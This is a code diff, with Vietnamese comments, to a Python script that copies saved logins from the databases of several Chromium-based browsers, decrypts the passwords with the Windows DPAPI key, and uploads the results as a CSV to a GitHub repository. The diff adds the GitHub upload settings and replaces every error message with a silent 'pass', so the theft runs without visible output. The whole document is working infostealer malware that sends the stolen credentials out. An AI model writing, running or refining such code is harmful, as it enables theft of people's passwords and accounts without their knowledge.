@@ -23,6 +23,12 @@ LOCAL_STATE_PATHS = {
     "CocCoc": os.path.expanduser("~") + r"\AppData\Local\CocCoc\Browser\User Data\Local State"
 }
 
+# Các biến cấu hình GitHub (hãy thay đổi theo cấu hình của bạn)
+GITHUB_USERNAME = "your_username"
+GITHUB_REPO = "your_repo"
+GITHUB_FILE_PATH = "passwords.csv"
+GITHUB_TOKEN = "your_github_token"
+
 def get_encryption_key(local_state_path):
     """Lấy key giải mã từ file Local State"""
     try:
@@ -32,8 +38,8 @@ def get_encryption_key(local_state_path):
         encrypted_key = encrypted_key[5:]  # Bỏ đi 5 byte đầu tiên
         key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return key
-    except Exception as e:
-        print(f"[LỖI LẤY KEY] {local_state_path} - {e}")
+    except Exception:
+        pass
         return None
 
 def decrypt_password(encrypted_password, key):
@@ -48,8 +54,8 @@ def decrypt_password(encrypted_password, key):
         else:
             decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
             return decrypted
-    except Exception as e:
-        print(f"[LỖI GIẢI MÃ] - {e}")
+    except Exception:
+        pass
         return "[LỖI GIẢI MÃ]"
 
 def extract_passwords():
@@ -66,8 +72,8 @@ def extract_passwords():
             copy_path = f"{browser}_LoginData.db"
             try:
                 shutil.copy2(path, copy_path)  # Copy file để tránh lỗi khóa
-            except Exception as e:
-                print(f"[LỖI SAO CHÉP FILE] {path} - {e}")
+            except Exception:
+                pass
                 continue
 
             try:
@@ -75,26 +81,28 @@ def extract_passwords():
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                 data = cursor.fetchall()
-            except Exception as e:
-                print(f"[LỖI TRUY VẤN DB] {copy_path} - {e}")
+            except Exception:
                 data = []
             finally:
                 try:
                     conn.close()
-                except Exception as e:
-                    print(f"[LỖI ĐÓNG DB] {copy_path} - {e}")
+                except Exception:
+                    pass
 
             try:
                 os.remove(copy_path)
-            except Exception as e:
-                print(f"[LỖI XÓA FILE] {copy_path} - {e}")
+            except Exception:
+                pass
 
             for row in data:
-                url, username, encrypted_password = row
-                password = decrypt_password(encrypted_password, key)
-                all_data.append([browser, url, username, password])
+                try:
+                    url, username, encrypted_password = row
+                    password = decrypt_password(encrypted_password, key)
+                    all_data.append([browser, url, username, password])
+                except Exception:
+                    pass
         else:
-            print(f"[THÔNG BÁO] Không tìm thấy file đăng nhập cho {browser}")
+            pass
 
     # Ghi dữ liệu vào file CSV trong bộ nhớ
     try:
@@ -110,8 +118,8 @@ def extract_passwords():
         
         # Upload file CSV lên GitHub
         upload_to_github(csv_output.getvalue())
-    except Exception as e:
-        print(f"[LỖI GHI CSV] - {e}")
+    except Exception:
+        pass
 
 def upload_to_github(file_content):
     """Tải file CSV lên GitHub"""
@@ -125,8 +133,7 @@ def upload_to_github(file_content):
                 sha = response.json().get("sha")
             else:
                 sha = None
-        except Exception as e:
-            print(f"[LỖI KIỂM TRA FILE TỒN TẠI] - {e}")
+        except Exception:
             sha = None
 
         data = {
@@ -138,15 +145,11 @@ def upload_to_github(file_content):
             data["sha"] = sha
 
         response = requests.put(url, headers=headers, json=data)
-        if response.status_code in [200, 201]:
-            print("[THÀNH CÔNG] File CSV đã được tải lên GitHub.")
-        else:
-            print(f"[LỖI UPLOAD] {response.status_code} - {response.text}")
-    except Exception as e:
-        print(f"[LỖI UPLOAD GITHUB] - {e}")
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     try:
         extract_passwords()
-    except Exception as e:
-        print(f"[LỖI CHUNG TRONG CHƯƠNG TRÌNH] - {e}")
+    except Exception:
+        pass
